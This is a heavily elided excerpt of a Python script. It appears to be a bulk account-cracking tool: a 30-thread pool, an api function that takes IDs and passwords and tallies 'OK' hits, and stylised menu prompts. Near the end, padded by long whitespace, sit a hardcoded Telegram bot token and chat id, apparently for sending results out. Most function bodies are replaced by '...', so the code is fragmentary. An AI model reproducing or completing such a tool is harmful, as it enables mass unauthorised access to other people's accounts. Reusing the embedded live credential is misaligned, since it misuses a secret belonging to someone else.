...
def main():
    ...
    print(f'\x1b[38;5;155m➤  [1] S-H-T-R  ')

    print(f'\x1b[38;5;155m➤  [2] ALLAHU AKBER ');linex()

    t=input('\x1b[38;5;155m[➤] RIFAT : ')
...
def bhoot():
    ...
    code = input(f'\x1b[38;5;155m[➤] Allahu Akbar : ');linex()
    ...
    with ThreadPool(max_workers=30) as RIFAT:
...
def api(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\x1b[38;5;155m[➤] S-H-T-R~FINDING  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
...
def suyaib():
    ...
    bot_token = '7796004439:AAEBoHVy8Pqi651WeLCYX4xNa8tT3EYqa6Q' 
    chat_id = '7444398641'    																																						
